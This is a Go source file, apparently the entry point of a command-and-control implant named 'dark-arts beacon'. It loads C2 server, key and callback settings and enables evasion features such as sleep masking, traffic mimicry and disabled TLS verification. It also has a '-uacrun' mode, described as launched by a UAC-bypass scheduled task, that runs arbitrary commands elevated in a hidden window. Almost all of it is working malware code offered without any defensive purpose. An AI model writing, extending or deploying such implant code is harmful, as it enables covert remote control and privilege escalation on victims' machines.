package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"syscall"
	"time"

	"darkarts/internal/version"
	"darkarts/pkg/beacon"
	"darkarts/pkg/logging"
)

// Baked at build time with -ldflags "-X main.cfg...=..." so the binary is
// self-contained; DARKARTS_* environment variables still take precedence.
var (
	cfgSeed      string
	cfgServerPub string
	cfgEdge      string
	cfgSID       string
	cfgSleepSecs string
	cfgJitter    string
	cfgLogFile   string
	cfgSleepMask string
	cfgInsecure  string
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "-uacrun" {
		os.Exit(uacRun())
	}

	log := logging.New(os.Getenv("DARKARTS_LOG_LEVEL"))
	if cfgLogFile != "" {
		if f, err := os.OpenFile(cfgLogFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600); err == nil {
			log = logging.NewWith(f, os.Getenv("DARKARTS_LOG_LEVEL"))
		}
	}

	seed := envOr("DARKARTS_SEED", cfgSeed)
	serverPubHex := envOr("DARKARTS_SERVER_PUB", cfgServerPub)
	edgeURL := envOr("DARKARTS_EDGE", cfgEdge)
	if seed == "" || serverPubHex == "" || edgeURL == "" {
		fmt.Fprintln(os.Stderr, "beacon: seed, server pub and edge are required (env or baked build config)")
		os.Exit(2)
	}
	serverPub, err := hex.DecodeString(serverPubHex)
	if err != nil || len(serverPub) == 0 {
		fmt.Fprintln(os.Stderr, "beacon: DARKARTS_SERVER_PUB must be hex")
		os.Exit(2)
	}
	sleepSecs := envIntOr("DARKARTS_SLEEP", cfgSleepSecs, 60)
	jitter := envFloatOr("DARKARTS_JITTER", cfgJitter, 0.2)
	taskTimeoutSecs := envInt("DARKARTS_TASK_TIMEOUT", 30)
	sleepMask := os.Getenv("DARKARTS_SLEEP_MASK") == "true" || cfgSleepMask == "true"

	client := &http.Client{Timeout: time.Duration(taskTimeoutSecs+5) * time.Second}
	if os.Getenv("DARKARTS_INSECURE") == "true" || cfgInsecure == "true" {
		client.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	}

	b, err := beacon.New(beacon.Config{
		SeedHex:     seed,
		ServerPub:   serverPub,
		EdgeURL:     edgeURL,
		SID:         envOr("DARKARTS_SID", cfgSID),
		Sleep:       time.Duration(sleepSecs) * time.Second,
		Jitter:      jitter,
		TaskTimeout: time.Duration(taskTimeoutSecs) * time.Second,
		UserAgent:   os.Getenv("DARKARTS_UA"),
		Mimic:       os.Getenv("DARKARTS_MIMIC") == "true",
		Noise:       os.Getenv("DARKARTS_NOISE") == "true",
		SleepMask:   sleepMask,
		StatePath:   filepath.Join(envOr("DARKARTS_STATE_DIR", "./data/beacon"), "state.json"),
		Log:         log,
		HTTP:        client,
	})
	if err != nil {
		log.Error("beacon init failed", "err", err)
		os.Exit(1)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	log.Info("dark-arts beacon starting", "version", version.Version, "sid", b.SID(), "edge", edgeURL)
	if err := b.Run(ctx); err != nil && !errors.Is(err, context.Canceled) {
		log.Error("beacon exited", "err", err)
		os.Exit(1)
	}
}

func envOr(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

func envInt(key string, def int) int {
	v := os.Getenv(key)
	if v == "" {
		return def
	}
	n, err := strconv.Atoi(v)
	if err != nil {
		return def
	}
	return n
}

func envIntOr(key, def string, fallback int) int {
	if def != "" {
		if n, err := strconv.Atoi(def); err == nil {
			return envInt(key, n)
		}
	}
	return envInt(key, fallback)
}

func envFloat(key string, def float64) float64 {
	v := os.Getenv(key)
	if v == "" {
		return def
	}
	f, err := strconv.ParseFloat(v, 64)
	if err != nil {
		return def
	}
	return f
}

func envFloatOr(key, def string, fallback float64) float64 {
	if def != "" {
		if f, err := strconv.ParseFloat(def, 64); err == nil {
			return envFloat(key, f)
		}
	}
	return envFloat(key, fallback)
}

// uacRun is the elevated helper mode launched by the reusable HIGHEST
// scheduled task created by the uac task ("schtasks" method). It reads the
// per-invocation config written by the beacon, runs the command elevated,
// writes stdout/stderr plus an exit marker to the requested file, then exits
// without starting a C2 session.
func uacRun() int {
	cfgPath := filepath.Join(os.Getenv("TEMP"), "darts-uac-cfg.json")
	raw, err := os.ReadFile(cfgPath)
	if err != nil {
		return 2
	}
	var cfg struct {
		Line string `json:"line"`
		Out  string `json:"out"`
	}
	if err := json.Unmarshal(raw, &cfg); err != nil {
		return 2
	}
	var code int
	var out []byte
	if cfg.Line != "" {
		cmd := exec.Command("cmd", "/c", cfg.Line)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, err = cmd.CombinedOutput()
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				code = ee.ExitCode()
			} else {
				code = 1
			}
		}
	}
	var buf bytes.Buffer
	buf.Write(out)
	fmt.Fprintf(&buf, "\r\n[exit %d]\r\n", code)
	if cfg.Out != "" {
		_ = os.WriteFile(cfg.Out, buf.Bytes(), 0o600)
	}
	return code
}
